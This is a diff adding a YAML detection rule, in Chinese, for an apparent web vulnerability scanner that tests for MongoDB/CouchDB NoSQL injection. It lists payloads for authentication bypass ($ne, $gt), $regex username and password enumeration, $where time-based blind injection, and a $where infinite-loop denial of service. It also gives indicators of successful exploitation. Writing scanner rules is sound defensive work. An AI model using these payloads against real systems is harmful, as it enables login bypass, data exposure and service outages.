@@ -1,0 +1,76 @@
+# NoSQL Injection 检测规则 (MongoDB)
+name: nosql_injection
+description: NoSQL Injection — MongoDB / CouchDB 查询注入
+severity: high
+owasp: "A03:2021 — Injection"
+confidence: 0.8
+enabled: true
+
+endpoint_filter:
+  methods: [GET, POST, PUT]
+  param_types: [query, body]
+
+payloads:
+  # MongoDB $ne / $gt 绕过
+  - value: '{"$ne": null}'
+    description: "$ne: null 绕过"
+    content_type: application/json
+  - value: '{"$gt": ""}'
+    description: "$gt: 空字符串绕过"
+    content_type: application/json
+  # MongoDB $where 注入
+  - value: '{"$where": "1==1"}'
+    description: "$where 恒真条件"
+    content_type: application/json
+  - value: '{"$where": "sleep(5000)"}'
+    description: "$where 时间盲注"
+    content_type: application/json
+  # 正则注入
+  - value: '{"username": {"$regex": "^admin"}}'
+    description: "$regex 用户名枚举"
+    content_type: application/json
+  - value: '{"password": {"$regex": "^.*"}}'
+    description: "$regex 密码通配"
+    content_type: application/json
+  # URL 参数中的 MongoDB 操作符
+  - value: '[$ne]=null'
+    description: "URL 参数 $ne 注入"
+  - value: '[$gt]='
+    description: "URL 参数 $gt 绕过"
+  # MongoDB 高级操作符
+  - value: '{"$exists": true}'
+    description: "$exists 操作符 — 探测字段是否存在"
+    content_type: application/json
+  - value: '{"$in": ["admin", "root", "superadmin"]}'
+    description: "$in 操作符 — 枚举已知用户名"
+    content_type: application/json
+  - value: '{"$nin": []}'
+    description: "$nin 空数组绕过"
+    content_type: application/json
+  - value: '{"$all": [{"$regex": ".*"}]}'
+    description: "$all + $regex 组合 — 通配匹配所有文档"
+    content_type: application/json
+  # NoSQL JavaScript 注入
+  - value: '{"$where": "while(true){}"}'
+    description: "$where 拒绝服务 (DoS)"
+    content_type: application/json
+  - value: '{"$where": "d = new Date; do {c = new Date;} while (c-d<5000)"}'
+    description: "$where JavaScript 时间盲注 (5秒延迟)"
+    content_type: application/json
+  # 运算符注入（URL Query）
+  - value: 'username[$ne]=invalid&password[$ne]=invalid'
+    description: "URL Query $ne 双重绕过"
+  - value: 'token[$exists]=true'
+    description: "$exists 探测隐藏字段"
+
+exploit_indicator:
+  patterns:
+    - "mongo"
+    - "bson"
+    - "cannot be applied to"
+    - "unknown operator"
+    - "got not"
+  status_codes: [200, 500]
+
+expected_normal: "NoSQL 查询应使用类型安全的 ORM/ODM 并验证输入结构"
+reasoning_template: "对 {param_name} 参数进行 NoSQL 注入测试，Payload: {payload_value}"
